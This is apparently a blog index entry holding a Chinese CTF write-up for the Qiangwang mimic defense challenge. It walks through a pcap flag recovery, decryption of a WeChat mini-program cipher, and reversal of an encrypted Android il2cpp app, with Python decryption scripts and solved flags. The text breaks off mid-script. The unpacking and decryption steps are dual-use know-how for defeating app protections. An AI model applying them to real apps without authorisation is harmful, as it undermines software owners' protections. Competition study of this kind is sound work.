<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>第八届“强网”拟态防御国际精英挑战赛</title>
    <link href="/2025/10/31/%E7%AC%AC%E5%85%AB%E5%B1%8A%E2%80%9C%E5%BC%BA%E7%BD%91%E2%80%9D%E6%8B%9F%E6%80%81%E9%98%B2%E5%BE%A1%E5%9B%BD%E9%99%85%E7%B2%BE%E8%8B%B1%E6%8C%91%E6%88%98%E8%B5%9B/"/>
    <url>/2025/10/31/%E7%AC%AC%E5%85%AB%E5%B1%8A%E2%80%9C%E5%BC%BA%E7%BD%91%E2%80%9D%E6%8B%9F%E6%80%81%E9%98%B2%E5%BE%A1%E5%9B%BD%E9%99%85%E7%B2%BE%E8%8B%B1%E6%8C%91%E6%88%98%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="低空经济网络安全"><a href="#低空经济网络安全" class="headerlink" title="低空经济网络安全"></a>低空经济网络安全</h1><h2 id="The-Hidden-Link"><a href="#The-Hidden-Link" class="headerlink" title="The Hidden Link"></a>The Hidden Link</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">我们截获了一个名为“MAV1”的恐怖组织发出的无人机遥测下行数据。`capture.pcap`中的数据流量看起来很正常，是吗？<br>W<span class="hljs-string">e&#x27;ve intercepted a drone&#x27;</span>s telemetry downlink <span class="hljs-keyword">from</span> a terrorist <span class="hljs-keyword">group</span> <span class="hljs-keyword">called</span> &quot;MAV1&quot;. The traffic <span class="hljs-keyword">in</span> `capture.pcap` appears <span class="hljs-keyword">to</span> be normal, <span class="hljs-keyword">or</span> <span class="hljs-keyword">is</span> it?<br></code></pre></td></tr></table></figure><p>访问几个数据包就会发现有疑似 flag 的字符</p><p><img src="https://img.dkdun.cn/v1/2025/12/7445be6e12538c08.png"></p><p>用 strings 提取字符</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">Bk3d&#125;</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">Bll3r</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">BflagJ</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">B&#123;dr0</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">Bt_c0:</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">Bntr0</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">B_h4c!</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">Bn3_f</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">Bl1gh</span><br></code></pre></td></tr></table></figure><p>去掉多余字母和标点符号，拼好 flag</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">flag&#123;dr<span class="hljs-number">0</span><span class="hljs-symbol">n3</span>_fl<span class="hljs-number">1</span>ght_c<span class="hljs-number">0</span><span class="hljs-symbol">ntr0</span>ll<span class="hljs-number">3</span>r_h<span class="hljs-number">4</span>ck<span class="hljs-number">3</span>d&#125;<br></code></pre></td></tr></table></figure><h1 id="Mobile"><a href="#Mobile" class="headerlink" title="Mobile"></a>Mobile</h1><h2 id="EZMiniAPP"><a href="#EZMiniAPP" class="headerlink" title="EZMiniAPP"></a>EZMiniAPP</h2><p>未加密，可以直接用 wxappUnpacker 反编译</p><p>在 chunk_0.appservice.js 文件中找到主函数，customEncrypt 是加密函数，有校验</p><p><img src="https://img.dkdun.cn/v1/2025/12/18050df4ad4cc704.png"></p><p>密文 ： [1, 33, 194, 133, 195, 102, 232, 104, 200, 14, 8, 163, 131, 71, 68, 97, 2, 76, 72, 171, 74, 106, 225, 1, 65]</p><p>密钥 Key： “newKey2025!”</p><p>要找出输入字符串 a，使得 <code>customEncrypt(a, &quot;newKey2025!&quot;)</code>  结果等于上面的密文数组，customEncrypt 直接调用了真正的加密函数 enigmaticTransformation</p><p>这里对密钥进行处理</p><p><img src="https://img.dkdun.cn/v1/2025/12/bfc125be7b0c8f93.png"></p><p>进行异或，用当前字符索引 o 对 3 取模的结果，采用不同的 XOR 规则</p><p><img src="https://img.dkdun.cn/v1/2025/12/e219ce3ca518f4bf.png"></p><p>按照值 c 不同对异或的结果 u 进行不同的移位</p><p><img src="https://img.dkdun.cn/v1/2025/12/11cfbafdce4552c2.png"></p><p>脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> json<br><br>TARGET_CIPHER = [<br>    <span class="hljs-number">1</span>, <span class="hljs-number">33</span>, <span class="hljs-number">194</span>, <span class="hljs-number">133</span>, <span class="hljs-number">195</span>, <span class="hljs-number">102</span>, <span class="hljs-number">232</span>, <span class="hljs-number">104</span>, <span class="hljs-number">200</span>, <span class="hljs-number">14</span>, <span class="hljs-number">8</span>, <span class="hljs-number">163</span>, <span class="hljs-number">131</span>, <br>    <span class="hljs-number">71</span>, <span class="hljs-number">68</span>, <span class="hljs-number">97</span>, <span class="hljs-number">2</span>, <span class="hljs-number">76</span>, <span class="hljs-number">72</span>, <span class="hljs-number">171</span>, <span class="hljs-number">74</span>, <span class="hljs-number">106</span>, <span class="hljs-number">225</span>, <span class="hljs-number">1</span>, <span class="hljs-number">65</span><br>]<br><br>KEY_STR = <span class="hljs-string">&quot;newKey2025!&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_key_array</span>(<span class="hljs-params">t_str</span>):<br>    <span class="hljs-keyword">return</span> [<span class="hljs-built_in">ord</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> t_str]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calculate_rotation_c</span>(<span class="hljs-params">i_arr</span>):<br>    t = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> e, val <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(i_arr):<br>        <span class="hljs-keyword">if</span> e % <span class="hljs-number">4</span> == <span class="hljs-number">0</span>:<br>            t += <span class="hljs-number">1</span> * val<br>        <span class="hljs-keyword">elif</span> e % <span class="hljs-number">4</span> == <span class="hljs-number">1</span>:<br>            t += val + <span class="hljs-number">0</span><br>        <span class="hljs-keyword">elif</span> e % <span class="hljs-number">4</span> == <span class="hljs-number">2</span>:<br>            t += <span class="hljs-number">0</span> | val<br>        <span class="hljs-keyword">elif</span> e % <span class="hljs-number">4</span> == <span class="hljs-number">3</span>:<br>            t += <span class="hljs-number">0</span> ^ val<br>    <span class="hljs-keyword">return</span> t % <span class="hljs-number">8</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">circular_right_shift</span>(<span class="hljs-params">value, shift</span>):<br>    value &amp;= <span class="hljs-number">0xFF</span> <br>    <span class="hljs-keyword">return</span> ((value &gt;&gt; shift) | (value &lt;&lt; (<span class="hljs-number">8</span> - shift))) &amp; <span class="hljs-number">0xFF</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">enigmatic_decryption</span>(<span class="hljs-params">cipher_arr, key_str</span>):<br>    key_arr = get_key_array(key_str)<br>    s = <span class="hljs-built_in">len</span>(key_arr)<br>    c = calculate_rotation_c(key_arr) <br><br>    decrypted_bytes = []<br>    <br>    <span class="hljs-keyword">for</span> o, h <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(cipher_arr):<br>        u = circular_right_shift(h, c)<br>        key_stream_val = key_arr[o % s]<br>        <br>        original_char_code = u ^ key_stream_val<br>        <br>        decrypted_bytes.append(original_char_code)<br><br>    <span class="hljs-keyword">try</span>:<br>        flag = <span class="hljs-string">&quot;&quot;</span>.join([<span class="hljs-built_in">chr</span>(b) <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> decrypted_bytes])<br>        <span class="hljs-keyword">return</span> flag<br>    <span class="hljs-keyword">except</span> ValueError:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;无法解码为有效字符串，可能解密错误&quot;</span><br><br>FLAG = enigmatic_decryption(TARGET_CIPHER, KEY_STR)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;目标密文 (Target Cipher): <span class="hljs-subst">&#123;TARGET_CIPHER&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;使用的密钥 (Key): &#x27;<span class="hljs-subst">&#123;KEY_STR&#125;</span>&#x27;&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;-&quot;</span> * <span class="hljs-number">30</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;计算出的旋转量 (c): <span class="hljs-subst">&#123;calculate_rotation_c(get_key_array(KEY_STR))&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;解密结果 (Flag): <span class="hljs-subst">&#123;FLAG&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>得到 flag</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;JustEasyMiniProgram&#125;</span><br></code></pre></td></tr></table></figure><h2 id="Just"><a href="#Just" class="headerlink" title="Just"></a>Just</h2><p>il2cpp 在安卓上的加密应用</p><p>查看源码，发现在程序启动时会加载 libjust.so 文件</p><p><img src="https://img.dkdun.cn/v1/2025/12/087c30a4ad0a0b09.png"></p><p>解包查看 libjust.so 文件，根据字符串定位到 sub_8288 函数，发现 hook 了dlopen</p><p><img src="https://img.dkdun.cn/v1/2025/12/150b7c758f257193.png"></p><p><img src="https://img.dkdun.cn/v1/2025/12/a8a1d9ef1639f9d4.png"></p><p>sub_8A0C 函数是校验函数，跟进分析，一个 RC4 的加密，异或 0x33</p><p>密钥为 “nihaounity”</p><p><img src="https://img.dkdun.cn/v1/2025/12/9b49f75c5f12e8c8.png"></p><p><img src="https://img.dkdun.cn/v1/2025/12/8b27d0258edaef79.png"></p><p>创建一个名为 “dec_il2cpp”的新文件，将解密后的内容写入此文件</p><p><img src="https://img.dkdun.cn/v1/2025/12/eb3da915dc7fdaa6.png"></p><p>加载 il2cpp.so 文件，发现加载不出来，所以可能需要解密这个 il2cpp.so</p><p><img src="https://img.dkdun.cn/v1/2025/12/5944452d05dbf31b.png"></p><p>根据加密逻辑和密钥用脚本解密 so 文件，脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_rc4_variant</span>(<span class="hljs-params">data: <span class="hljs-built_in">bytes</span>, key: <span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;nihaounity&quot;</span>, xor_constant: <span class="hljs-built_in">int</span> = <span class="hljs-number">0x33</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br><br>    key_bytes = key.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    key_len = <span class="hljs-built_in">len</span>(key_bytes)<br>    data_len = <span class="hljs-built_in">len</span>(data)<br><br>    s_box = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br><br>    j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + s_box[i] + key_bytes[i % key_len]) % <span class="hljs-number">256</span><br>        s_box[i], s_box[j] = s_box[j], s_box[i]<br>    i = <span class="hljs-number">0</span><br>    j = <span class="hljs-number">0</span><br>    decrypted_data = <span class="hljs-built_in">bytearray</span>(data)<br><br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(data_len):<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + s_box[i]) % <span class="hljs-number">256</span><br>        s_box[i], s_box[j] = s_box[j], s_box[i]<br>        t = (s_box[i] + s_box[j]) % <span class="hljs-number">256</span><br>        keystream_byte = s_box[t]<br>        decrypted_data[k] = data[k] ^ keystream_byte ^ xor_constant<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(decrypted_data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br><br>    input_path = sys.argv[<span class="hljs-number">1</span>]<br>    output_path = sys.argv[<span class="hljs-number">2</span>]<br>    KEY = <span class="hljs-string">&quot;nihaounity&quot;</span><br>    XOR_CONST = <span class="hljs-number">0x33</span><br><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(input_path, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            encrypted_data = f.read()<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[*] 正在读取文件: <span class="hljs-subst">&#123;input_path&#125;</span> (<span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(encrypted_data)&#125;</span> 字节)&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[*] 解密密钥: &#x27;<span class="hljs-subst">&#123;KEY&#125;</span>&#x27;, 异或常数: 0x<span class="hljs-subst">&#123;XOR_CONST:02x&#125;</span>&quot;</span>)<br>        <br>        decrypted_data = decrypt_rc4_variant(encrypted_data, KEY, XOR_CONST)<br><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(output_path, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            f.write(decrypted_data)<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 解密完成，文件已保存至: <span class="hljs-subst">&#123;output_path&#125;</span>&quot;</span>)<br><br>    <span class="hljs-keyword">except</span> FileNotFoundError:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[!] 错误: 找不到文件 <span class="hljs-subst">&#123;input_path&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[!] 发生错误: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>加载解密出来的 decil2cpp.so，文件很大，加载很慢，根据字符串的 global-metadata.dat 定位过去</p><p><img src="https://img.dkdun.cn/v1/2025/12/41929ce197bcbd01.png"></p><p>定位到 sub_211B8C 函数，发现这里在定位并加载元数据文件，调用了 sub_211D94 函数加载</p><p><img src="https://img.dkdun.cn/v1/2025/12/f4e50fa745cc942b.png"></p><p>跟进</p><p><img src="https://img.dkdun.cn/v1/2025/12/c17646a2974eb246.png"></p><p>加载数据的地方，继续跟进</p><p><img src="https://img.dkdun.cn/v1/2025/12/c66cdb2fdc6c6077.png"></p><p>来到 sub_21A2C8，这是一个解密函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> *__fastcall <span class="hljs-title function_">sub_21A2C8</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> __int16 *a1, __int64 a2)</span><br>&#123;<br>  __int64 v2; <span class="hljs-comment">// x21</span><br>  __int64 v4; <span class="hljs-comment">// x8</span><br>  __int64 v5; <span class="hljs-comment">// x22</span><br>  <span class="hljs-type">char</span> *v6; <span class="hljs-comment">// x19</span><br>  __int64 i; <span class="hljs-comment">// x8</span><br>  __int64 v8; <span class="hljs-comment">// x13</span><br>  __int64 v9; <span class="hljs-comment">// x12</span><br><br>  v2 = a1[<span class="hljs-number">512</span>];<br>  v4 = a2 - <span class="hljs-number">4</span> * v2;<br>  v5 = v4 - <span class="hljs-number">1028</span>;<br>  v6 = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(v4 - <span class="hljs-number">4</span>);<br>  <span class="hljs-built_in">memcpy</span>(v6, a1, <span class="hljs-number">0x400</span>u);<br>  <span class="hljs-keyword">if</span> ( v5 &gt;= <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; v5; i += <span class="hljs-number">4</span> )<br>    &#123;<br>      v8 = i + <span class="hljs-number">3</span>;<br>      v9 = i + i / v2;<br>      <span class="hljs-keyword">if</span> ( i &gt;= <span class="hljs-number">0</span> )<br>        v8 = i;<br>      *(_DWORD *)&amp;v6[(v8 &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFFC</span>LL) + <span class="hljs-number">1024</span>] = *(_DWORD *)((<span class="hljs-type">char</span> *)&amp;a1[<span class="hljs-number">2</span> * v2 + <span class="hljs-number">514</span>]<br>                                                                     + (v8 &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFFC</span>LL))<br>                                                         ^ *(_DWORD *)&amp;a1[<span class="hljs-number">2</span> * (v9 % v2) + <span class="hljs-number">514</span>];<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> v6;<br>&#125;<br></code></pre></td></tr></table></figure><p>根据逻辑写解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_metadata_custom_xor</span>(<span class="hljs-params">encrypted_data: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    data_len = <span class="hljs-built_in">len</span>(encrypted_data)<br><br>    v2 = struct.unpack(<span class="hljs-string">&#x27;&lt;H&#x27;</span>, encrypted_data[<span class="hljs-number">1024</span>:<span class="hljs-number">1026</span>])[<span class="hljs-number">0</span>]<br>    v5 = data_len - (<span class="hljs-number">4</span> * v2) - <span class="hljs-number">1028</span><br>    decrypted_data = <span class="hljs-built_in">bytearray</span>(encrypted_data)<br>    encrypted_data_base_offset = <span class="hljs-number">4</span> * v2 + <span class="hljs-number">1028</span><br>    keystream_base_offset = <span class="hljs-number">1028</span><br><br>    i = <span class="hljs-number">0</span> <br>    <span class="hljs-keyword">while</span> i &lt; v5:<br>        v9 = i + i // v2<br>        keystream_index = v9 % v2<br>        keystream_offset = keystream_base_offset + keystream_index * <span class="hljs-number">4</span><br>        encrypted_offset = encrypted_data_base_offset + i<br>        decrypted_offset = <span class="hljs-number">1024</span> + i<br>        keystream_block = struct.unpack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, encrypted_data[keystream_offset:keystream_offset+<span class="hljs-number">4</span>])[<span class="hljs-number">0</span>]<br>        encrypted_block = struct.unpack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, encrypted_data[encrypted_offset:encrypted_offset+<span class="hljs-number">4</span>])[<span class="hljs-number">0</span>]<br>        decrypted_block = encrypted_block ^ keystream_block<br>        struct.pack_into(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, decrypted_data, decrypted_offset, decrypted_block)<br>        <br>        i += <span class="hljs-number">4</span><br>        <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 解密完成。共处理 <span class="hljs-subst">&#123;i&#125;</span> 字节数据。&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(decrypted_data)<br>    expected_output_len = data_len - (<span class="hljs-number">4</span> * v2) - <span class="hljs-number">4</span><br>    <br>    <span class="hljs-keyword">if</span> expected_output_len &lt; <span class="hljs-built_in">len</span>(decrypted_data):<br>        decrypted_data = decrypted_data[:expected_output_len]<br>        <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 解密完成。共处理 <span class="hljs-subst">&#123;i&#125;</span> 字节数据。最终输出长度: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(decrypted_data)&#125;</span> 字节&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(decrypted_data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    input_path = sys.argv[<span class="hljs-number">1</span>]<br>    output_path = sys.argv[<span class="hljs-number">2</span>]<br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(input_path, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        encrypted_data = f.read()<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[*] 正在读取文件: <span class="hljs-subst">&#123;input_path&#125;</span> (<span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(encrypted_data)&#125;</span> 字节)&quot;</span>)<br>    decrypted_data = decrypt_metadata_custom_xor(encrypted_data)<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(output_path, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(decrypted_data)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 解密完成，文件已保存至: <span class="hljs-subst">&#123;output_path&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>解密后的 dat 文件用 Il2CppDumper 直接解包</p><p><img src="https://img.dkdun.cn/v1/2025/12/00d3b8af7bf992c2.png"></p><p>进入 DummyDll 目录，查看 Assembly-CSharp.dll，可以看到 Check 函数和加密函数</p><p><img src="https://img.dkdun.cn/v1/2025/12/cd6c5205dfbd7d36.png"></p><p>so 附加 Il2CppDumper 自动生成的 ida_py3.py 脚本和 script.json 文件恢复符号表，找 Flagchecker 看逻辑</p><p>CheckFlag 函数中有加密，两段不一样的，前面对前 8 个字节进行 tea 加密，v78 是 40 字节的密文</p><p><img src="https://img.dkdun.cn/v1/2025/12/4066a7447d75e5fb.png"></p><p>后一段是对剩下的 32 字节处理，每 8 字节还与前一个 8 字节进行异或</p><p><img src="https://img.dkdun.cn/v1/2025/12/55e419b47d592310.png"></p><p>观察 tea 函数，密文存在 a2 指向的内存位置</p><p><img src="https://img.dkdun.cn/v1/2025/12/dd79dc89c493ae3c.png"></p><p>密文和密钥我没有环境，不好调试，在 cctor 中有初始化类的静态字段，初始化了密钥和密文，可以从这 Filed 去找</p><p><img src="https://img.dkdun.cn/v1/2025/12/ce9ef01f983743aa.png"></p><p>查看 dump.cs，搜索 PrivateImplementationDetails </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">internal sealed <span class="hljs-class"><span class="hljs-keyword">class</span> &lt;</span>PrivateImplementationDetails&gt; <span class="hljs-comment">// TypeDefIndex: 2223</span><br>&#123;<br><span class="hljs-comment">// Fields</span><br>internal <span class="hljs-type">static</span> readonly &lt;PrivateImplementationDetails&gt;.__StaticArrayInitTypeSize=<span class="hljs-number">40</span> <span class="hljs-number">29F</span>C2CC7503351583297C73AC477A5D7AA78899F3C0D66E1F909139D4AA1FFB2 <span class="hljs-comment">/*Metadata offset 0xF901D*/</span>; <span class="hljs-comment">// 0x0</span><br>internal <span class="hljs-type">static</span> readonly &lt;PrivateImplementationDetails&gt;.__StaticArrayInitTypeSize=<span class="hljs-number">16</span> C8E4E9E3F34C25560172B0D40B6DF4823260AA87EC6866054AA4691711E5D7BF <span class="hljs-comment">/*Metadata offset 0xF9045*/</span>; <span class="hljs-comment">// 0x28</span><br>&#125;<br></code></pre></td></tr></table></figure><p>这里找到了偏移 0xF901D 和 0xF904，直接按结构偏移读 global-data.dat 的数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys, binascii<br><span class="hljs-keyword">from</span> pathlib <span class="hljs-keyword">import</span> Path<br><br>META_PATH = <span class="hljs-string">&quot;g-d.dat&quot;</span><br><br>DEFAULTS = &#123;<br>    <span class="hljs-string">&quot;Ciphertext_40&quot;</span>: &#123;<span class="hljs-string">&quot;offset&quot;</span>: <span 